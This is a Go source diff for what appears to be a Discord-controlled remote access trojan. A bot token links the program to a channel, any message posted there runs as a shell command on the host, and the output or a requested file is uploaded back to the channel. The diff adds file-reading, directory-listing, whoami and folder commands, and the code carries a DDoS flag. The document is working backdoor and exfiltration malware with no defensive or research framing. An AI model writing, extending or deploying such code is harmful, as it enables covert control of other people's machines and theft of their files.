@@ -8,6 +8,8 @@ import (
 	"os"
 	"os/exec"
 	"os/signal"
+	"os/user"
+	"path/filepath"
 	"strings"
 	"syscall"
 
@@ -15,17 +17,15 @@ import (
 )
 
 var (
-	Token         string = ""
-	Prefix        string = "!"
-	PrefixCommand string = ""
-	hostname      string
-	Console       string
-	IsDDos        bool = false
+	Token    string = ""
+	Prefix   string = "!"
+	hostname string
+	Console  string
+	IsDDos   bool = false
 )
 
 func main() {
 	hostname, _ = os.Hostname()
-	check_system()
 
 	dg, err := discordgo.New("Bot " + Token)
 	if err != nil {
@@ -46,13 +46,6 @@ func main() {
 	<-sc
 
 	dg.Close()
-}
-
-func check_system() {
-	_, err := output_command("ls")
-	if err != nil {
-		PrefixCommand = "cmd /c "
-	}
 }
 
 func messageCreate(s *discordgo.Session, m *discordgo.MessageCreate) {
@@ -81,7 +74,7 @@ func messageCreate(s *discordgo.Session, m *discordgo.MessageCreate) {
 			if len(commands) == 1 {
 				s.ChannelMessageSend(Console, "Укажите имя файла")
 			} else {
-				file, err := os.Open(commands[1])
+				file, err := os.Open(strings.Join(commands[1:], " "))
 				state, _ := file.Stat()
 
 				if err != nil {
@@ -122,9 +115,67 @@ func messageCreate(s *discordgo.Session, m *discordgo.MessageCreate) {
 					file.Close()
 				}
 			}
+		} else if commands[0] == "dir" || commands[0] == "ls" {
+			dir, _ := os.ReadDir(".")
+			var output string
 
+			for _, file := range dir {
+				if file.IsDir() {
+					output += file.Name() + "/" + "\n"
+				} else {
+					output += file.Name() + "\n"
+				}
+			}
+
+			_, err := s.ChannelMessageSend(Console, "```"+output+"```")
+			if err != nil {
+				max_len_output_command(s, output)
+			}
+		} else if commands[0] == "whoami" {
+			usr, _ := user.Current()
+			s.ChannelMessageSend(Console, "```"+usr.Username+"```")
+		} else if commands[0] == "mkdir" {
+			if len(commands) == 1 {
+				s.ChannelMessageSend(Console, "Укажите название папки")
+				return
+			}
+
+			err := os.Mkdir(commands[1], 0777)
+
+			if err != nil {
+				s.ChannelMessageSend(Console, fmt.Sprintf("Во время создания папки произошла ошибка: %v", err))
+			} else {
+				s.ChannelMessageSend(Console, "Папка успешна создана")
+			}
+		} else if commands[0] == "rmdir" {
+			if len(commands) == 1 {
+				s.ChannelMessageSend(Console, "Укажите название папки")
+				return
+			}
+
+			err := os.Remove(commands[1])
+
+			if err != nil {
+				s.ChannelMessageSend(Console, fmt.Sprintf("Во время удаления папки произошла ошибка: %v", err))
+			} else {
+				s.ChannelMessageSend(Console, "Папка успешна удалена")
+			}
+		} else if commands[0] == "cat" {
+			if len(commands) == 1 {
+				s.ChannelMessageSend(Console, "Укажите имя файла")
+				return
+			}
+
+			output, _ := os.ReadFile(commands[1])
+			_, err := s.ChannelMessageSend(Console, "```"+string(output)+"```")
+			if err != nil {
+				max_len_output_command(s, string(output))
+			}
+		} else if commands[0] == "pwd" {
+			pwd, _ := filepath.Abs(".")
+			s.ChannelMessageSend(Console, "```"+pwd+"```")
 		} else {
-			output, err := output_command(PrefixCommand + m.Content)
+			output, err := output_command(m.Content)
 			var output_edit string
 
 			if err != nil {
@@ -137,17 +188,7 @@ func messageCreate(s *discordgo.Session, m *discordgo.MessageCreate) {
 
 			_, err = s.ChannelMessageSend(Console, output_edit)
 			if err != nil {
-				path_file := os.TempDir() + "/result.txt"
-
-				fw, _ := os.Create(path_file)
-				fw.WriteString(output)
-				fw.Close()
-
-				file, _ := os.Open(path_file)
-
-				s.ChannelFileSend(Console, "result.txt", file)
-
-				os.Remove(path_file)
+				max_len_output_command(s, output)
 			}
 		}
 
@@ -203,4 +244,18 @@ func output_command(cmd string) (string, error) {
 	c, err := exec.Command(command, args...).Output()
 
 	return string(c), err
+}
+
+func max_len_output_command(s *discordgo.Session, output string) {
+	path_file := os.TempDir() + "/result.txt"
+
+	fw, _ := os.Create(path_file)
+	fw.WriteString(output)
+	fw.Close()
+
+	file, _ := os.Open(path_file)
+
+	s.ChannelFileSend(Console, "result.txt", file)
+
+	os.Remove(path_file)
 }
